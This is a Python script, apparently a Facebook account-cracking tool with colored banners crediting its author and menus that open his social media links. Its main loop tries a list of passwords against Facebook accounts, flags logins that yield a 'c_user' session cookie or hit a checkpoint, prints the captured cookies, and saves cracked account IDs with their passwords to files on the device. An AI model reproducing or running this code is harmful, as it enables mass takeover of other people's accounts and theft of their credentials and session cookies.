...
\033[1;32m║ AUTHOR : MD ASLAM HOSSAIN  (MD.ASLAM)           ║║       \x1b[1;91m|__-__|\033[1;32m        ║
\033[1;32m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
\033[1;32m║TELEGRAM  : Md Aslam Hossain           ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
\033[1;32m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
\033[1;32m║GITHUB    : abir        ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
\033[1;32m║══════════════════════════════════║║                      ║
\033[1;32m║SERVER    : DATA - WIFI WORKING   ║╚══════════════════════╝
\033[1;32m║══════════════════════════════════════════════════════════╗
\033[1;32m║FACEBOOK LINK : \x1b[1;91mhttps://www.facebook.com/hajera12345a\033[1;32m  ║
\033[1;32m║══════════════════════════════════════════════════════════║
\033[1;32m║FB PAGE LINK  : \x1b[1;91mhttps://facebook.com/groups/801895034437555/\033[1;32m    ║
\033[1;32m╚══════════════════════════════════════════════════════════╝\033[1;37m""")
...
def ud():
    ...
    if opt == '1':
        os.system('xdg-open https://www.youtube.com/@prankvedio2581')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100085314499002')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/hajera12345a')
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/@prankvedio2581')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/hajera12345a')
        return None
...
\033[1;32m║AUTHOR    : MD ASLAM HOSSAIN  (Md.Aslam)        ║║       \x1b[1;91m|__-__|\033[1;32m        ║
\033[1;32m║══════════════════════════════════║║       \x1b[1;91m/| []|'\033[1;32m        ║
\033[1;32m║TELEGRAM  : Aslam Hossain           ║║     \x1b[1;91m()/|___|\()\033[1;32m      ║
\033[1;32m║══════════════════════════════════║║        \x1b[1;91m|_|_|\033[1;32m         ║
\033[1;32m║GITHUB    : Abir         ║║       \x1b[1;91m|_| |_|\033[1;32m        ║
\033[1;32m║══════════════════════════════════║║                      ║
\033[1;32m║SERVER    : DATA - WIFI WORKING   ║╚══════════════════════╝
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(Md.ASLAM-OK😍)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Md.ASLAM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(Md.ASLAM-CP🥺)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Md.ASLAM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[Md.ASLAM] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
